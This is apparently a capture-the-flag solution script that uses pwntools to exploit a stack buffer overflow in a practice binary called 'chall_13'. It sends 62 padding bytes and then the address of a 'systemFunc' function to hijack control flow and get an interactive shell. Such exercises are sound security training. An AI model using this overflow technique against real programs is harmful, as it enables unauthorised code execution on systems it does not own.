'''
Flaws: No canary, No PIE, symbols

3a = 58 offset
'''

from pwn import *
elf = ELF("./chall_13")
p = process("./chall_13")
l1 = b"something"
p.sendline(l1)

offset = 58
l2 = b"A" * (offset + 4) + p32(elf.sym.systemFunc)
p.sendline(l2)
p.interactive()
